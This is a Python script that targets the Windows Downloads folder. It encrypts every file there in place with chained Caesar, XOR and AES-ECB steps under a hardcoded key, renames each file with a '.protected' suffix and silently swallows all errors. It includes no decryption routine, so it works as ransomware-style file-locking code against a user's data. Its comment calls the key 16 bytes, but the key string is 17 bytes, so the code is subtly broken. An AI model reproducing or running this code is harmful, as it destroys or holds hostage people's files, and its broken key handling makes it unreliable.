import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import shutil

# Constants
KEY = b'magicspellmagicsp'  # 16-byte AES key ("magicspell" padded)
CAESAR_SHIFT = 3
USERPROFILE_DOWNLOADS = os.path.join(os.environ['USERPROFILE'], 'Downloads')

# Caesar cipher encryption
def caesar_encrypt(data, shift):
    encrypted = bytearray()
    for byte in data:
        encrypted.append((byte + shift) % 256)
    return bytes(encrypted)

# XOR encryption
def xor_encrypt(data, key):
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

# AES encryption
def aes_encrypt(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pad(data, AES.block_size))

# Encrypt file contents
def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        data = file.read()

    # Apply Caesar cipher
    caesar_encrypted = caesar_encrypt(data, CAESAR_SHIFT)

    # Apply XOR encryption
    xor_encrypted = xor_encrypt(caesar_encrypted, KEY)

    # Apply AES encryption
    aes_encrypted = aes_encrypt(xor_encrypted, KEY)

    # Write encrypted data back
    with open(file_path, 'wb') as file:
        file.write(aes_encrypted)

# Process files in directory
def encrypt_directory(directory):
    for root, _, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)

            try:
                encrypt_file(file_path)

                # Rename file
                new_name = file_name + '.protected'
                new_path = os.path.join(root, new_name)
                os.rename(file_path, new_path)
            except Exception:
                pass  # Suppress exceptions silently

if __name__ == '__main__':
    if os.path.exists(USERPROFILE_DOWNLOADS):
        encrypt_directory(USERPROFILE_DOWNLOADS)
